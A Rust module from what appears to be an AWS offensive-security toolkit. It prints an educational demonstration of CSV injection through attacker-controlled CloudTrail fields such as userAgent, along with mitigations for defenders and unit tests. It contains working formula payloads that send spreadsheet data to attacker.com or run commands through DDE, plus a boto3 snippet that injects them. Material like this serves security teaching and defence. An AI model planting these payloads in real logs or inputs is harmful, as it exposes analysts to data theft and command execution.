//! cloudtrail__csv_injection — educational PoC for CSV injection via CloudTrail event exports.
//!
//! Category: LATERAL_MOVE. Services: ["CloudTrail"].
//!
//! Read-only — demonstrates the attack without executing it.
//!
//! What it does:
//!   1. Show which CloudTrail event fields are susceptible to CSV injection
//!   2. Print a sample crafted payload
//!   3. Explain the attack: attacker-controlled fields in CloudTrail events
//!      can execute Excel formulas when a defender exports to CSV and opens in Excel
//!   4. Display which fields the attacker controls (UserAgent, RequestParameters)
//!
//! No API calls needed — this is a display/education module.

use colored::Colorize;

use crate::module::{AwsContext, Module, ModuleInfo};

// ---------------------------------------------------------------------------
// Module entry point
// ---------------------------------------------------------------------------

pub async fn run(_ctx: &AwsContext, _args: &[&str]) -> anyhow::Result<()> {
    println!("{}", "cloudtrail__csv_injection".cyan().bold());
    println!(
        "  {}",
        "Educational PoC: CSV Injection via CloudTrail event exports\n".yellow()
    );

    // ── Overview ───────────────────────────────────────────────────────────
    println!(
        "  {}",
        "OVERVIEW".white().bold()
    );
    println!(
        "  When security teams export CloudTrail logs to CSV and open them in spreadsheet\n  \
         applications (Excel, LibreOffice Calc), attacker-controlled field values that\n  \
         start with '=', '+', '-', or '@' are interpreted as formulas and executed.\n"
    );

    // ── Susceptible Fields ─────────────────────────────────────────────────
    println!("  {}", "SUSCEPTIBLE CLOUDTRAIL FIELDS".white().bold());
    println!();

    let fields = [
        (
            "userAgent",
            "Full attacker control — set via AWS SDK user agent override or raw HTTP User-Agent header",
            true,
        ),
        (
            "requestParameters",
            "Partial attacker control — values in API request bodies (e.g., tag values, resource names)",
            true,
        ),
        (
            "sourceIPAddress",
            "Attacker-controlled IP address or hostname",
            true,
        ),
        (
            "eventName",
            "Not attacker-controlled — determined by the AWS API endpoint called",
            false,
        ),
        (
            "userName",
            "Attacker-controlled if using a crafted IAM username or role session name",
            true,
        ),
        (
            "errorMessage",
            "Partially attacker-controlled through malformed input that triggers specific errors",
            false,
        ),
    ];

    for (field, description, controlled) in &fields {
        let indicator = if *controlled {
            "[ATTACKER-CONTROLLED]".red().bold()
        } else {
            "[NOT CONTROLLED]     ".green().bold()
        };
        println!("  {} {}", indicator, field.yellow().bold());
        println!("             {}", description.dimmed());
        println!();
    }

    // ── Sample Payloads ────────────────────────────────────────────────────
    println!("  {}", "SAMPLE CSV INJECTION PAYLOADS".white().bold());
    println!();

    let payloads = [
        (
            "Data exfiltration via HYPERLINK",
            r#"=HYPERLINK("http://attacker.com/?data="&A1,"Click")"#,
            "Exfiltrates cell A1 contents to attacker server when victim clicks",
        ),
        (
            "Silent data exfiltration (no click needed in some versions)",
            r#"=WEBSERVICE("http://attacker.com/?d="&A1&B1)"#,
            "LibreOffice Calc WEBSERVICE function fetches URL automatically",
        ),
        (
            "Command execution via DDE (older Excel)",
            r#"=cmd|'/c calc.exe'!A0"#,
            "Dynamic Data Exchange injection — executes OS command in legacy Excel",
        ),
        (
            "Formula injection via tag value",
            r#"=1+1"=cmd|'/c whoami'!A0"#,
            "Injected via resource tag values in CreateBucket, RunInstances, etc.",
        ),
        (
            "Exfil via userAgent field",
            r#"=HYPERLINK(CONCAT("http://attacker.com/c?t=",ENCODEURL(A1)),"View")"#,
            "Set as AWS SDK User-Agent header — appears verbatim in CloudTrail userAgent field",
        ),
    ];

    for (label, payload, explanation) in &payloads {
        println!("  {} {}", "[PAYLOAD]".red().bold(), label.yellow());
        println!("  {}", "─".repeat(70).dimmed());
        println!("  {}", payload.green());
        println!("  {}", explanation.dimmed());
        println!();
    }

    // ── Attack Scenario ────────────────────────────────────────────────────
    println!("  {}", "ATTACK SCENARIO".white().bold());
    println!();
    println!(
        "  1. Attacker sets AWS SDK user agent to a CSV formula:\n     \
         {}",
        r#"=HYPERLINK("http://attacker.com/?data="&A1,"Click")"#.green()
    );
    println!();
    println!(
        "  2. Attacker makes any AWS API call (e.g., sts:GetCallerIdentity).\n     \
         CloudTrail records the event with the formula in the {} field.",
        "userAgent".yellow()
    );
    println!();
    println!(
        "  3. Defender exports CloudTrail to CSV via the console or:\n     \
         {}",
        "aws cloudtrail lookup-events --output csv > events.csv".dimmed()
    );
    println!();
    println!(
        "  4. Defender opens {} in Excel/LibreOffice.\n     \
         The formula {} executes automatically or on click.",
        "events.csv".yellow(),
        "HYPERLINK(...)".red()
    );
    println!();
    println!(
        "  5. Attacker receives HTTP request at {} containing spreadsheet data.",
        "http://attacker.com/".red()
    );
    println!();

    // ── Affected Field in CloudTrail JSON ─────────────────────────────────
    println!("  {}", "EXAMPLE CLOUDTRAIL EVENT (affected userAgent field)".white().bold());
    println!();
    let example_event = r#"  {
    "eventVersion": "1.08",
    "userIdentity": { "type": "IAMUser", "userName": "attacker" },
    "eventTime": "2026-05-27T00:00:00Z",
    "eventSource": "sts.amazonaws.com",
    "eventName": "GetCallerIdentity",
    "sourceIPAddress": "203.0.113.1",
    "userAgent": "=HYPERLINK(\"http://attacker.com/?data=\"&A1,\"Click\")",
    "requestParameters": null,
    "responseElements": null
  }"#;
    println!("{}", example_event.dimmed());
    println!();

    // ── Attacker-Controlled SDK Fields ────────────────────────────────────
    println!("  {}", "HOW TO INJECT via userAgent (Python SDK)".white().bold());
    println!();
    println!("{}", r#"  import boto3
  from botocore.config import Config

  payload = '=HYPERLINK("http://attacker.com/?d="&A1,"data")'
  session = boto3.Session()
  client = session.client(
      'sts',
      config=Config(user_agent=payload)   # injected into userAgent field
  )
  client.get_caller_identity()"#.green());
    println!();

    // ── Mitigations ────────────────────────────────────────────────────────
    println!("  {}", "MITIGATIONS (for defenders)".white().bold());
    println!();
    let mitigations = [
        "Disable formula execution in Excel: File → Options → Trust Center → External Content",
        "Use CSV import wizard and treat all data as text (not formula) type",
        "Pre-process CloudTrail exports: escape leading =, +, -, @ characters",
        "Use SIEM tools (Splunk, Elastic) instead of raw CSV exports for analysis",
        "Apply Microsoft's 'Protected View' and 'Attack Surface Reduction' rules",
    ];
    for (i, m) in mitigations.iter().enumerate() {
        println!("  {}. {}", i + 1, m.cyan());
    }

    println!();
    println!(
        "  {}",
        "This module is for educational purposes and authorized security testing only.".yellow().bold()
    );

    Ok(())
}

// ---------------------------------------------------------------------------
// Module registration
// ---------------------------------------------------------------------------

inventory::submit! {
    Module {
        info: ModuleInfo {
            name: "cloudtrail__csv_injection",
            author: "lancer-pacu",
            category: "LATERAL_MOVE",
            one_liner: "Educational PoC: demonstrates CSV injection via attacker-controlled CloudTrail fields.",
            services: &["CloudTrail"],
        },
        run: |ctx, args| Box::pin(run(ctx, args)),
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------
#[cfg(test)]
mod tests {
    use crate::module::Module;

    #[test]
    fn module_registered_in_inventory() {
        let found = inventory::iter::<Module>
            .into_iter()
            .any(|m| m.info.name == "cloudtrail__csv_injection");
        assert!(found, "cloudtrail__csv_injection not found in inventory");
    }

    #[test]
    fn module_category_is_lateral_move() {
        let m = inventory::iter::<Module>
            .into_iter()
            .find(|m| m.info.name == "cloudtrail__csv_injection")
            .expect("cloudtrail__csv_injection not found");
        assert_eq!(m.info.category, "LATERAL_MOVE");
    }

    #[test]
    fn module_services_include_cloudtrail() {
        let m = inventory::iter::<Module>
            .into_iter()
            .find(|m| m.info.name == "cloudtrail__csv_injection")
            .expect("cloudtrail__csv_injection not found");
        assert!(m.info.services.contains(&"CloudTrail"));
    }

    #[tokio::test]
    async fn run_succeeds_without_aws_creds() {
        // This module makes no API calls — should always succeed
        let sdk_config = aws_config::defaults(aws_config::BehaviorVersion::latest())
            .no_credentials()
            .load()
            .await;
        let ctx = crate::module::AwsContext {
            dry_run: true,
            armed: false,
            sdk_config,
            db_pool: None,
        };
        let result = super::run(&ctx, &[]).await;
        assert!(
            result.is_ok(),
            "cloudtrail__csv_injection should always succeed (no API calls): {:?}",
            result.err()
        );
    }

    #[tokio::test]
    async fn run_with_extra_args_does_not_error() {
        let sdk_config = aws_config::defaults(aws_config::BehaviorVersion::latest())
            .no_credentials()
            .load()
            .await;
        let ctx = crate::module::AwsContext {
            dry_run: true,
            armed: false,
            sdk_config,
            db_pool: None,
        };
        // Extra unknown args should not cause errors
        let result = super::run(&ctx, &["--verbose", "--some-flag"]).await;
        assert!(result.is_ok(), "unexpected error: {:?}", result.err());
    }
}
